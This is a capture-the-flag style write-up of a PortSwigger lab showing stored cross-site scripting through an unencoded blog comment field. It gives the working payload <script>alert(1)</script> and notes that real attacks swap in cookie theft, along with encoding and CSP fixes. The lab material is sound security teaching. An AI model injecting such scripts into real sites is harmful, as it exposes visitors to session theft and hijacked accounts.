# PortSwigger — Stored XSS into HTML Context with Nothing Encoded

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The comment functionality stores user input directly into the database and reflects it back into the HTML response without any sanitisation or encoding. Injecting a `<script>` tag into the comment field causes the browser to execute arbitrary JavaScript for every visitor who loads the blog post, triggering an `alert()` call and solving the lab.

**Lab URL:** `https://0a3e008f04bb2cd981585775008c004d.web-security-academy.net/`

---

## Challenge Description

> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
>
> To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — Stored**
- Goal: Inject a payload into the comment form that triggers `alert(1)` whenever the blog post is loaded

---

## Recon

### Step 1 — Identify the injection point

Each blog post exposes a comment form at the bottom of the page:

```
https://0a3e008f04bb2cd981585775008c004d.web-security-academy.net/post?postId=1
```

The form contains the following fields:
- **Comment** ← primary injection point
- **Name**
- **Email**
- **Website**

Submitting a normal comment, the content is stored in the database and rendered back on the page inside the post's HTML.

### Step 2 — Confirm the injection is unfiltered

Submitting a comment with a basic HTML tag:

```
Comment: <b>hello</b>
```

Revisiting the post shows the tag is rendered by the browser — the text appears **bold** rather than as raw text:

```html
<p><b>hello</b></p>
```

No HTML entity encoding is applied (`<` is not converted to `&lt;`, `>` is not converted to `&gt;`). **HTML injection confirmed** ✅

---

## Exploitation

### Step 3 — Inject a script tag

Since comment content is stored verbatim and reflected into the HTML context, a standard `<script>` tag will be executed by every browser that loads the page:

```html
<script>alert(1)</script>
```

The server stores the payload and generates the following HTML on the blog post page:

```html
<p><script>alert(1)</script></p>
```

The browser parses the `<script>` tag as valid JavaScript, executes `alert(1)`, and the dialog box appears.

### Step 4 — Submit the payload

Fill in the comment form on any blog post:

| Field   | Value                          |
|---------|--------------------------------|
| Comment | `<script>alert(1)</script>`    |
| Name    | `test`                         |
| Email   | `test@test.com`                |
| Website | *(leave blank or any value)*   |

Click **Post Comment**. The page redirects back to the blog post, the payload executes immediately, and the `alert(1)` dialog fires.

```
✅ Congratulations, you solved the lab!
```

---

## Stored vs. Reflected — Key Difference

Unlike reflected XSS where the payload lives in the URL and only executes for the victim who clicks a crafted link, **stored XSS** is permanently written to the server. Every user who visits the affected page is a victim — no phishing link required.

```
Reflected XSS:  attacker crafts URL → victim clicks → payload executes once
Stored XSS:     attacker submits comment → payload persists in DB → every visitor is hit
```

---

## Attack Chain Summary

```
Comment form submitted with: <script>alert(1)</script>
        ↓
Server stores raw payload in database (no sanitisation)
        ↓
Any visitor loads /post?postId=1
        ↓
Server fetches comment and injects it verbatim into HTML response:
  <p><script>alert(1)</script></p>
        ↓
Browser parses <script> tag → executes alert(1)
        ↓
Alert dialog fires → LAB SOLVED ✅
```

---

## Key Takeaways

- **Stored XSS** occurs when user-supplied input is persisted server-side and later rendered without sanitisation — the impact is amplified because every visitor is affected automatically
- **HTML context injection** is the simplest XSS variant — no attribute breakout or JavaScript context escape is needed, a bare `<script>` tag is sufficient
- In a real attack, `alert(1)` would be replaced by a payload that **steals session cookies** (`document.cookie`), silently performs authenticated actions, or redirects victims to a phishing page
- The fix: HTML-encode all user-controlled output at render time (`<` → `&lt;`, `>` → `&gt;`), validate/reject unexpected input server-side, and enforce a strict **Content Security Policy** to block inline script execution

---

## References

- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)